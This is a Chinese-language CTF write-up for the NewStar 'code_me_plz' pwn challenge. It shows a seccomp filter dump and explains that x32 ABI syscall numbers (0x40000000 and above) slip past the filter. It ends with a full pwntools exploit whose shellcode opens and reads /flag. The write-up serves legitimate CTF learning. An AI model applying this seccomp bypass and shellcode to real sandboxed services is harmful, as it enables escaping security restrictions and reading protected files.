---
title: code_me_plz
date: 2023-03-19 10:44:02
categories: 
- pwn_wp
tags: 
- pwn
- sandbox



---

NewStar CTF Week5的题，用x32 ABI绕过沙箱

<!--more-->

查壳，保护全开

```sh
[*] '/home/a1ph0nse/PwnPractice/CtfGame/NewStar/code_me_plz/cod3'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

程序比较简单

```c
void __noreturn vuln()
{
  puts("Show me your code:");
  read(0, zone, 0x100uLL);
  close(1);
  ((void (*)(void))zone)();
  _exit(0);
}
```

会直接执行我们输入的内容，因此我们需要写一段shellcode来完成我们的工作。

开了沙箱

```sh
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x05 0x00 0x40000000  if (A >= 0x40000000) goto 0009 # 允许sys_number>=0x40000000
 0004: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0009
 0005: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0009
 0006: 0x15 0x02 0x00 0x00000003  if (A == close) goto 0009
 0007: 0x15 0x01 0x00 0x0000000c  if (A == brk) goto 0009
 0008: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL
```

看起来只允许`read`、`write`、`close`、`brk`和`exit_group`，其他的都不可以，这不但让我们不能走`execve`，并且还凑不齐`orw`。

但在`0003`可以看到`if (A >= 0x40000000) goto 0009`，这意味着我们可以使用`sys_number>=0x40000000`的指令，而这些指令都是32位程序的接口，64位系统为了支持32位系统，保留了这些接口。

x32 ABI与64位下的系统调用方法几乎无异，只不过系统调用号都是不小于0x40000000，并且要求使用32位指针。

具体的调用表可以查看系统头文件中的`/usr/src/linux-headers-$version-generic/arch/x86/include/generated/uapi/asm/unistd_x32.h`，大致如下：

```c
// #define __X32_SYSCALL_BIT	0x40000000

#ifndef _UAPI_ASM_UNISTD_X32_H
#define _UAPI_ASM_UNISTD_X32_H

#define __NR_read (__X32_SYSCALL_BIT + 0)
#define __NR_write (__X32_SYSCALL_BIT + 1)
#define __NR_open (__X32_SYSCALL_BIT + 2)
#define __NR_close (__X32_SYSCALL_BIT + 3)

...

#endif /* _UAPI_ASM_UNISTD_X32_H */
```

因此这里我们就可以利用`0x40000002`的`open`来补上`orw`缺少的`open`。

**小迷惑：shellcode明明可以直接将"/flag"入栈，为什么wp要那样处理一番来得到**

**exp:**

```py
from pwn import*
context(log_level='debug',os='linux',arch='amd64')
filename='cod3'
elf=ELF('./'+filename)
#libc=ELF('')
# p=process('./'+filename)
#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})
p=remote('node4.buuoj.cn',26063)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()
    
    # mov rax, 0x1111111111111111^0x67616c662f
    # push rax
    # mov rax, 0x1111111111111111
    # xor [rsp], rax
ru("Show me your code:\n")
shellcode=asm(
    '''
    mov rax, 0x67616c662f
    push rax
    
    push 0x40000002
    pop rax
    mov rdi, rsp
    mov rdx, 0x440
    xor rsi, rsi
    syscall

    mov rdi, rax
    sub rsp, rdx
    mov rsi, rsp
    xor rax, rax
    syscall

    mov rdx, rax
    push 0x2
    pop rdi
    push 0x1
    pop rax
    syscall 
    
    '''
)
# debug()
leak('length of shellcode: ',len(shellcode))
s(shellcode)

itr()

```

